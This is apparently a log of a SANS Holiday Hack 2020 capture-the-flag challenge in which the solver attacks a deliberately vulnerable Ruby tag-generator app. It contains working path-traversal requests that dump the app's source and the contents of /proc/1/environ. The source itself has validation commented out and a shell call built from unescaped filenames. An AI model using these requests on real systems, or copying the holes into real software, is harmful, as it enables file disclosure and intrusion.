2020-12-29 01:46:47.995 +00:00 [VRB] Started SANS Holiday Hack, December 2020
2020-12-29 01:46:48.013 +00:00 [VRB] Using CTF runner 0.1.0-alpha.21
2020-12-29 01:46:48.015 +00:00 [VRB] Running challange BrokenTagGenerator
2020-12-29 01:46:48.017 +00:00 [INF] Upload a text file and we find out about /app/lib/app.rb and some /tmp/RackMultipart20201228-1-dzifup.txt

                ERROR
                Something went wrong!
                Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201228-1-dzifup.txt

                Close
            
2020-12-29 01:46:48.017 +00:00 [INF] https://tag-generator.kringlecastle.com/app

                Something went wrong!
                Error in /app/lib/app.rb: Route not found

            
2020-12-29 01:46:48.018 +00:00 [INF] fabric.js

                toDataURL: function(t, e, i) {
                        return t.toDataURL("image/" + e, i)
                },
            
2020-12-29 01:46:48.018 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!
            
2020-12-29 01:46:48.018 +00:00 [INF] https://tag-generator.kringlecastle.com/share

                Something went wrong!
                Error in /app/lib/app.rb: ID is missing!

                https://tag-generator.kringlecastle.com/share?id=????
            
2020-12-29 01:46:48.019 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=

                PGgxPlNvbWV0aGluZyB3ZW50IHdyb25nITwvaDE+Cgo8cD5FcnJvciBpbiAvYXBwL2xpYi9hcHAucmI6IElzIGEgZGlyZWN0b3J5IEAgaW9fZnJlYWQgLSAvdG1wLzwvcD4K
            
2020-12-29 01:46:48.019 +00:00 [INF] base64 returns <p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>
<h1>Something went wrong!</h1>

<p>Error in /app/lib/app.rb: Is a directory @ io_fread - /tmp/</p>

2020-12-29 01:46:48.019 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=..%2Fapp%2Flib%2Fapp.rb

               IyBlbmNvZGluZzogQVNDSUktOEJJVAoKVE1QX0ZPTERFUiA9ICcvdG1wJwpGSU5BTF9GT0xERVIgPSAnL3RtcCcKCiMgRG9uJ3QgcHV0IHRoZSB1cGxvYWRzIGluIHRoZSBhcHBsaWNhdGlvbiBmb2xkZXIKRGlyLmNoZGlyIFRNUF9GT0xERVIKCnJlcXVpcmUgJ3J1YnlnZW1zJwoKcmVxdWlyZSAnanNvbicKcmVxdWlyZSAnc2luYXRyYScKcmVxdWlyZSAnc2luYXRyYS9iYXNlJwpyZXF1aXJlICdzaW5nbG9nZ2VyJwpyZXF1aXJlICdzZWN1cmVyYW5kb20nCgpyZXF1aXJlICd6aXAnCnJlcXVpcmUgJ3NpbmF0cmEvY29va2llcycKcmVxdWlyZSAnY2dpJwoKcmVxdWlyZSAnZGlnZXN0L3NoYTEnCgpMT0dHRVIgPSA6OlNpbmdMb2dnZXIuaW5zdGFuY2UoKQoKTUFYX1NJWkUgPSAxMDI0KioyKjUgIyA1bWIKCiMgTWFudWFsbHkgZXNjYXBpbmcgaXMgYW5ub3lpbmcsIGJ1dCBTaW5hdHJhIGlzIGxpZ2h0d2VpZ2h0IGFuZCBkb2Vzbid0IGhhdmUKIyBzdHVmZiBsaWtlIHRoaXMgYnVpbHQgaW4gOigKZGVmIGgoaHRtbCkKICBDR0kuZXNjYXBlSFRNTCBodG1sCmVuZAoKZGVmIGhhbmRsZV96aXAoZmlsZW5hbWUpCiAgTE9HR0VSLmRlYnVnKCJQcm9jZXNzaW5nICN7IGZpbGVuYW1lIH0gYXMgYSB6aXAiKQogIG91dF9maWxlcyA9IFtdCgogIFppcDo6RmlsZS5vcGVuKGZpbGVuYW1lKSBkbyB8emlwX2ZpbGV8CiAgICAjIEhhbmRsZSBlbnRyaWVzIG9uZSBieSBvbmUKICAgIHppcF9maWxlLmVhY2ggZG8gfGVudHJ5fAogICAgICBMT0dHRVIuZGVidWcoIkV4dHJhY3RpbmcgI3tlbnRyeS5uYW1lfSIpCgogICAgICBpZiBlbnRyeS5zaXplID4gTUFYX1NJWkUKICAgICAgICByYWlzZSAnRmlsZSB0b28gbGFyZ2Ugd2hlbiBleHRyYWN0ZWQnCiAgICAgIGVuZAoKICAgICAgaWYgZW50cnkubmFtZSgpLmVuZF93aXRoPygnemlwJykKICAgICAgICByYWlzZSAnTmVzdGVkIHppcCBmaWxlcyBhcmUgbm90IHN1cHBvcnRlZCEnCiAgICAgIGVuZAoKICAgICAgIyBJIHdvbmRlciB3aGF0IHRoaXMgd2lsbCBkbz8gLS1KYWNrCiAgICAgICMgaWYgZW50cnkubmFtZSAhfiAvXlthLXpBLVowLTkuXy1dKyQvCiAgICAgICMgICByYWlzZSAnSW52YWxpZCBmaWxlbmFtZSEgRmlsZW5hbWVzIG1heSBjb250YWluIGxldHRlcnMsIG51bWJlcnMsIHBlcmlvZCwgdW5kZXJzY29yZSwgYW5kIGh5cGhlbicKICAgICAgIyBlbmQKCiAgICAgICMgV2Ugd2FudCB0byBleHRyYWN0IGludG8gVE1QX0ZPTERFUgogICAgICBvdXRfZmlsZSA9ICIjeyBUTVBfRk9MREVSIH0vI3sgZW50cnkubmFtZSB9IgoKICAgICAgIyBFeHRyYWN0IHRvIGZpbGUgb3IgZGlyZWN0b3J5IGJhc2VkIG9uIG5hbWUgaW4gdGhlIGFyY2hpdmUKICAgICAgZW50cnkuZXh0cmFjdChvdXRfZmlsZSkgewogICAgICAgICMgSWYgdGhlIGZpbGUgZXhpc3RzLCBzaW1wbHkgb3ZlcndyaXRlCiAgICAgICAgdHJ1ZQogICAgICB9CgogICAgICAjIFByb2Nlc3MgaXQKICAgICAgb3V0X2ZpbGVzIDw8IHByb2Nlc3NfZmlsZShvdXRfZmlsZSkKICAgIGVuZAogIGVuZAoKICByZXR1cm4gb3V0X2ZpbGVzCmVuZAoKZGVmIGhhbmRsZV9pbWFnZShmaWxlbmFtZSkKICBvdXRfZmlsZW5hbWUgPSAiI3sgU2VjdXJlUmFuZG9tLnV1aWQgfSN7RmlsZS5leHRuYW1lKGZpbGVuYW1lKS5kb3duY2FzZX0iCiAgb3V0X3BhdGggPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgb3V0X2ZpbGVuYW1lIH0iCgogICMgUmVzaXplIGFuZCBjb21wcmVzcyBpbiB0aGUgYmFja2dyb3VuZAogIFRocmVhZC5uZXcgZG8KICAgIGlmICFzeXN0ZW0oImNvbnZlcnQgLXJlc2l6ZSA4MDB4NjAwXFw+IC1xdWFsaXR5IDc1ICcjeyBmaWxlbmFtZSB9JyAnI3sgb3V0X3BhdGggfSciKQogICAgICBMT0dHRVIuZXJyb3IoIlNvbWV0aGluZyB3ZW50IHdyb25nIHdpdGggZmlsZSBjb252ZXJzaW9uOiAjeyBmaWxlbmFtZSB9IikKICAgIGVsc2UKICAgICAgTE9HR0VSLmRlYnVnKCJGaWxlIHN1Y2Nlc3NmdWxseSBjb252ZXJ0ZWQ6ICN7IGZpbGVuYW1lIH0iKQogICAgZW5kCiAgZW5kCgogICMgUmV0dXJuIGp1c3QgdGhlIGZpbGVuYW1lIC0gd2UgY2FuIGZpZ3VyZSB0aGF0IG91dCBsYXRlcgogIHJldHVybiBvdXRfZmlsZW5hbWUKZW5kCgpkZWYgcHJvY2Vzc19maWxlKGZpbGVuYW1lKQogIG91dF9maWxlcyA9IFtdCgogIGlmIGZpbGVuYW1lLmRvd25jYXNlLmVuZF93aXRoPygnemlwJykKICAgICMgQXBwZW5kIHRoZSBsaXN0IHJldHVybmVkIGJ5IGhhbmRsZV96aXAKICAgIG91dF9maWxlcyArPSBoYW5kbGVfemlwKGZpbGVuYW1lKQogIGVsc2lmIGZpbGVuYW1lLmRvd25jYXNlLmVuZF93aXRoPygnanBnJykgfHwgZmlsZW5hbWUuZG93bmNhc2UuZW5kX3dpdGg/KCdqcGVnJykgfHwgZmlsZW5hbWUuZG93bmNhc2UuZW5kX3dpdGg/KCdwbmcnKQogICAgIyBBcHBlbmQgdGhlIG5hbWUgcmV0dXJuZWQgYnkgaGFuZGxlX2ltYWdlCiAgICBvdXRfZmlsZXMgPDwgaGFuZGxlX2ltYWdlKGZpbGVuYW1lKQogIGVsc2UKICAgIHJhaXNlICJVbnN1cHBvcnRlZCBmaWxlIHR5cGU6ICN7IGZpbGVuYW1lIH0iCiAgZW5kCgogIHJldHVybiBvdXRfZmlsZXMKZW5kCgpkZWYgcHJvY2Vzc19maWxlcyhmaWxlcykKICByZXR1cm4gZmlsZXMubWFwIHsgfGZ8IHByb2Nlc3NfZmlsZShmKSB9LmZsYXR0ZW4oKQplbmQKCm1vZHVsZSBUYWdHZW5lcmF0b3IKICBjbGFzcyBTZXJ2ZXIgPCBTaW5hdHJhOjpCYXNlCiAgICBoZWxwZXJzIFNpbmF0cmE6OkNvb2tpZXMKCiAgICBkZWYgaW5pdGlhbGl6ZSgqYXJncykKICAgICAgc3VwZXIoKmFyZ3MpCiAgICBlbmQKCiAgICBjb25maWd1cmUgZG8KICAgICAgaWYoZGVmaW5lZD8oUEFSQU1TKSkKICAgICAgICBzZXQgOnBvcnQsIFBBUkFNU1s6cG9ydF0KICAgICAgICBzZXQgOmJpbmQsIFBBUkFNU1s6aG9zdF0KICAgICAgZW5kCgogICAgICBzZXQgOnJhaXNlX2Vycm9ycywgZmFsc2UKICAgICAgc2V0IDpzaG93X2V4Y2VwdGlvbnMsIGZhbHNlCiAgICBlbmQKCiAgICBlcnJvciBkbwogICAgICByZXR1cm4gNTAxLCBlcmIoOmVycm9yLCA6bG9jYWxzID0+IHsgbWVzc2FnZTogIkVycm9yIGluICN7IF9fRklMRV9fIH06ICN7IGgoZW52WydzaW5hdHJhLmVycm9yJ10ubWVzc2FnZSkgfSIgfSkKICAgIGVuZAoKICAgIG5vdF9mb3VuZCBkbwogICAgICByZXR1cm4gNDA0LCBlcmIoOmVycm9yLCA6bG9jYWxzID0+IHsgbWVzc2FnZTogIkVycm9yIGluICN7IF9fRklMRV9fIH06IFJvdXRlIG5vdCBmb3VuZCIgfSkKICAgIGVuZAoKICAgIGdldCAnLycgZG8KICAgICAgZXJiKDppbmRleCkKICAgIGVuZAoKICAgIHBvc3QgJy91cGxvYWQnIGRvCiAgICAgIGltYWdlcyA9IFtdCiAgICAgIGltYWdlcyArPSBwcm9jZXNzX2ZpbGVzKHBhcmFtc1snbXlfZmlsZSddLm1hcCB7IHxwfCBwWyd0ZW1wZmlsZSddLnBhdGggfSkKICAgICAgaW1hZ2VzLnNvcnQhKCkKICAgICAgaW1hZ2VzLnVuaXEhKCkKCiAgICAgIGNvbnRlbnRfdHlwZSA6anNvbgogICAgICBpbWFnZXMudG9fanNvbgogICAgZW5kCgogICAgZ2V0ICcvY2xlYXInIGRvCiAgICAgIGNvb2tpZXMuZGVsZXRlKDppbWFnZXMpCgogICAgICByZWRpcmVjdCAnLycKICAgIGVuZAoKICAgIGdldCAnL2ltYWdlJyBkbwogICAgICBpZiAhcGFyYW1zWydpZCddCiAgICAgICAgcmFpc2UgJ0lEIGlzIG1pc3NpbmchJwogICAgICBlbmQKCiAgICAgICMgVmFsaWRhdGlvbiBpcyBib3JpbmchIC0tSmFjawogICAgICAjIGlmIHBhcmFtc1snaWQnXSAhfiAvXlthLXpBLVowLTkuXy1dKyQvCiAgICAgICMgICByZXR1cm4gNDAwLCAnSW52YWxpZCBpZCEgaWQgbWF5IGNvbnRhaW4gbGV0dGVycywgbnVtYmVycywgcGVyaW9kLCB1bmRlcnNjb3JlLCBhbmQgaHlwaGVuJwogICAgICAjIGVuZAoKICAgICAgY29udGVudF90eXBlICdpbWFnZS9qcGVnJwoKICAgICAgZmlsZW5hbWUgPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgcGFyYW1zWydpZCddIH0iCgogICAgICBpZiBGaWxlLmV4aXN0cz8oZmlsZW5hbWUpCiAgICAgICAgcmV0dXJuIEZpbGUucmVhZChmaWxlbmFtZSkKICAgICAgZWxzZQogICAgICAgIHJldHVybiA0MDQsICJJbWFnZSBub3QgZm91bmQhIgogICAgICBlbmQKICAgIGVuZAoKICAgIGdldCAnL3NoYXJlJyBkbwogICAgICBpZiAhcGFyYW1zWydpZCddCiAgICAgICAgcmFpc2UgJ0lEIGlzIG1pc3NpbmchJwogICAgICBlbmQKCiAgICAgIGZpbGVuYW1lID0gIiN7IEZJTkFMX0ZPTERFUiB9LyN7IHBhcmFtc1snaWQnXSB9LnBuZyIKCiAgICAgIGlmIEZpbGUuZXhpc3RzPyhmaWxlbmFtZSkKICAgICAgICBlcmIoOnNoYXJlLCA6bG9jYWxzID0+IHsgaWQ6IHBhcmFtc1snaWQnXSB9KQogICAgICBlbHNlCiAgICAgICAgcmV0dXJuIDQwNCwgIkltYWdlIG5vdCBmb3VuZCEiCiAgICAgIGVuZAogICAgZW5kCgogICAgcG9zdCAnL3NhdmUnIGRvCiAgICAgIHBheWxvYWQgPSBwYXJhbXMKICAgICAgcGF5bG9hZCA9IEpTT04ucGFyc2UocmVxdWVzdC5ib2R5LnJlYWQpCgogICAgICBkYXRhX3VybCA9IHBheWxvYWRbJ2RhdGFVUkwnXQogICAgICBwbmcgPSBCYXNlNjQuZGVjb2RlNjQoZGF0YV91cmxbJ2RhdGE6aW1hZ2UvcG5nO2Jhc2U2NCwnLmxlbmd0aCAuLiAtMV0pCgogICAgICBvdXRfaGFzaCA9IERpZ2VzdDo6U0hBMS5oZXhkaWdlc3QgcG5nCiAgICAgIG91dF9maWxlbmFtZSA9ICIjeyBvdXRfaGFzaCB9LnBuZyIKICAgICAgb3V0X3BhdGggPSAiI3sgRklOQUxfRk9MREVSIH0vI3sgb3V0X2ZpbGVuYW1lIH0iCiAgICAgIAogICAgICBMT0dHRVIuZGVidWcoIm91dHB1dDogI3tvdXRfcGF0aH0iKQogICAgICBGaWxlLm9wZW4ob3V0X3BhdGgsICd3YicpIHsgfGZ8IGYud3JpdGUocG5nKSB9CiAgICAgIHsgaWQ6IG91dF9oYXNoIH0udG9fanNvbgogICAgZW5kCiAgZW5kCmVuZAo=  
            
2020-12-29 01:46:48.022 +00:00 [INF] /app/lib/app.rb
# encoding: ASCII-8BIT

TMP_FOLDER = '/tmp'
FINAL_FOLDER = '/tmp'

# Don't put the uploads in the application folder
Dir.chdir TMP_FOLDER

require 'rubygems'

require 'json'
require 'sinatra'
require 'sinatra/base'
require 'singlogger'
require 'securerandom'

require 'zip'
require 'sinatra/cookies'
require 'cgi'

require 'digest/sha1'

LOGGER = ::SingLogger.instance()

MAX_SIZE = 1024**2*5 # 5mb

# Manually escaping is annoying, but Sinatra is lightweight and doesn't have
# stuff like this built in :(
def h(html)
  CGI.escapeHTML html
end

def handle_zip(filename)
  LOGGER.debug("Processing #{ filename } as a zip")
  out_files = []

  Zip::File.open(filename) do |zip_file|
    # Handle entries one by one
    zip_file.each do |entry|
      LOGGER.debug("Extracting #{entry.name}")

      if entry.size > MAX_SIZE
        raise 'File too large when extracted'
      end

      if entry.name().end_with?('zip')
        raise 'Nested zip files are not supported!'
      end

      # I wonder what this will do? --Jack
      # if entry.name !~ /^[a-zA-Z0-9._-]+$/
      #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
      # end

      # We want to extract into TMP_FOLDER
      out_file = "#{ TMP_FOLDER }/#{ entry.name }"

      # Extract to file or directory based on name in the archive
      entry.extract(out_file) {
        # If the file exists, simply overwrite
        true
      }

      # Process it
      out_files << process_file(out_file)
    end
  end

  return out_files
end

def handle_image(filename)
  out_filename = "#{ SecureRandom.uuid }#{File.extname(filename).downcase}"
  out_path = "#{ FINAL_FOLDER }/#{ out_filename }"

  # Resize and compress in the background
  Thread.new do
    if !system("convert -resize 800x600\\> -quality 75 '#{ filename }' '#{ out_path }'")
      LOGGER.error("Something went wrong with file conversion: #{ filename }")
    else
      LOGGER.debug("File successfully converted: #{ filename }")
    end
  end

  # Return just the filename - we can figure that out later
  return out_filename
end

def process_file(filename)
  out_files = []

  if filename.downcase.end_with?('zip')
    # Append the list returned by handle_zip
    out_files += handle_zip(filename)
  elsif filename.downcase.end_with?('jpg') || filename.downcase.end_with?('jpeg') || filename.downcase.end_with?('png')
    # Append the name returned by handle_image
    out_files << handle_image(filename)
  else
    raise "Unsupported file type: #{ filename }"
  end

  return out_files
end

def process_files(files)
  return files.map { |f| process_file(f) }.flatten()
end

module TagGenerator
  class Server < Sinatra::Base
    helpers Sinatra::Cookies

    def initialize(*args)
      super(*args)
    end

    configure do
      if(defined?(PARAMS))
        set :port, PARAMS[:port]
        set :bind, PARAMS[:host]
      end

      set :raise_errors, false
      set :show_exceptions, false
    end

    error do
      return 501, erb(:error, :locals => { message: "Error in #{ __FILE__ }: #{ h(env['sinatra.error'].message) }" })
    end

    not_found do
      return 404, erb(:error, :locals => { message: "Error in #{ __FILE__ }: Route not found" })
    end

    get '/' do
      erb(:index)
    end

    post '/upload' do
      images = []
      images += process_files(params['my_file'].map { |p| p['tempfile'].path })
      images.sort!()
      images.uniq!()

      content_type :json
      images.to_json
    end

    get '/clear' do
      cookies.delete(:images)

      redirect '/'
    end

    get '/image' do
      if !params['id']
        raise 'ID is missing!'
      end

      # Validation is boring! --Jack
      # if params['id'] !~ /^[a-zA-Z0-9._-]+$/
      #   return 400, 'Invalid id! id may contain letters, numbers, period, underscore, and hyphen'
      # end

      content_type 'image/jpeg'

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }"

      if File.exists?(filename)
        return File.read(filename)
      else
        return 404, "Image not found!"
      end
    end

    get '/share' do
      if !params['id']
        raise 'ID is missing!'
      end

      filename = "#{ FINAL_FOLDER }/#{ params['id'] }.png"

      if File.exists?(filename)
        erb(:share, :locals => { id: params['id'] })
      else
        return 404, "Image not found!"
      end
    end

    post '/save' do
      payload = params
      payload = JSON.parse(request.body.read)

      data_url = payload['dataURL']
      png = Base64.decode64(data_url['data:image/png;base64,'.length .. -1])

      out_hash = Digest::SHA1.hexdigest png
      out_filename = "#{ out_hash }.png"
      out_path = "#{ FINAL_FOLDER }/#{ out_filename }"
      
      LOGGER.debug("output: #{out_path}")
      File.open(out_path, 'wb') { |f| f.write(png) }
      { id: out_hash }.to_json
    end
  end
end

2020-12-29 01:46:48.115 +00:00 [INF] Jack Frost commented out file name validation within zip archives in def handle_zip(filename).


                # I wonder what this will do? --Jack
                # if entry.name !~ /^[a-zA-Z0-9._-]+$/
                #   raise 'Invalid filename! Filenames may contain letters, numbers, period, underscore, and hyphen'
                # end
            
2020-12-29 01:46:48.117 +00:00 [INF] hmm... created zip file with ../app/lib/app.rb file name but the injection did not work... 

                ERROR
                Something went wrong!
                Error in /app/lib/app.rb: Permission denied @ rb_sysopen - /tmp/../app/lib/app.rb

                Close
            
2020-12-29 01:46:48.158 +00:00 [INF] https://tag-generator.kringlecastle.com/image?id=..%2Fproc%2F1%2Fenviron

                UEFUSD0vdXNyL2xvY2FsL2J1bmRsZS9iaW46L3Vzci9sb2NhbC9zYmluOi91c3IvbG9jYWwvYmluOi91c3Ivc2JpbjovdXNyL2Jpbjovc2JpbjovYmluAEhPU1ROQU1FPWNiZjI4MTBiNzU3MwBSVUJZX01BSk9SPTIuNwBSVUJZX1ZFUlNJT049Mi43LjAAUlVCWV9ET1dOTE9BRF9TSEEyNTY9MjdkMzUwYTUyYTAyYjUzMDM0Y2EwNzk0ZWZlNTE4NjY3ZDU1OGYxNTI2NTZjMmJhYWYwOGYzZDBjOGIwMjM0MwBHRU1fSE9NRT0vdXNyL2xvY2FsL2J1bmRsZQBCVU5ETEVfU0lMRU5DRV9ST09UX1dBUk5JTkc9MQBCVU5ETEVfQVBQX0NPTkZJRz0vdXNyL2xvY2FsL2J1bmRsZQBBUFBfSE9NRT0vYXBwAFBPUlQ9NDE0MQBIT1NUPTAuMC4wLjAAR1JFRVRaPUphY2tGcm9zdFdhc0hlcmUASE9NRT0vaG9tZS9hcHAA
              
                PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOSTNAME=cbf2810b7573 RUBY_MAJOR=2.7 RUBY_VERSION=2.7.0 RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343 GEM_HOME=/usr/local/bundle BUNDLE_SILENCE_ROOT_WARNING=1 BUNDLE_APP_CONFIG=/usr/local/bundle APP_HOME=/app PORT=4141 HOST=0.0.0.0 GREETZ=JackFrostWasHere HOME=/home/app 
            

            
2020-12-29 01:46:48.165 +00:00 [VRB] Challenge BrokenTagGenerator completed
